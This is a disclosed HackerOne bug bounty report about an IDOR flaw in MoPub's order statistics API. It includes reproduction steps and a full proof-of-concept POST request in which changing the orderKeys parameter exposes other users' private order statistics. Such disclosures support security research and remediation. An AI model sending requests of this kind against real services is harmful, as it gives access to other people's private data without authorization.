# IDOR and statistics leakage in Orders 

## Report Details
- **Report ID**: 544329
- **URL**: https://hackerone.com/reports/544329
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-04-20T18:33:14.854Z
- **Disclosed**: 2019-06-14T00:08:40.415Z

## Reporter
- **Username**: updatelap
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: x

## Vulnerability Information
**Description:** 
Twitter on its service "MoPub" statistics dedicated to the results of "Order", after the test shows that the endpoint "https://app.mopub.com/web-client/api/orders/stats/query" is infected with a "IDOR " bug

Which led to the leak of private statistics "Orders" by another users

## Steps To Reproduce:

  1. [Create account in https://app.mopub.com/ and login]
  1. [go to the link https://app.mopub.com/orders and create Order ]
  1. [using this POST Request you can disclose statistics another orders By changing the value of the parameter __orderKeys__ in body request]

```
POST /web-client/api/orders/stats/query HTTP/1.1
Host: app.mopub.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:66.0) Gecko/20100101 Firefox/66.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://app.mopub.com/orders
Content-Type: application/json
x-csrftoken: {TOKEN}
Content-Length: 98
Connection: close
Cookie: csrftoken={TOKEN}; sessionid={SID}; mp_mixpanel__c=1;


{"startTime":"2019-04-07","endTime":"2019-04-20","orderKeys":["43b29d60a9724fa9abbdc800044002d6"]}
```
{F472873}

## Impact

__leakage statistics__

## Attachments
- OrderDiscStat.png
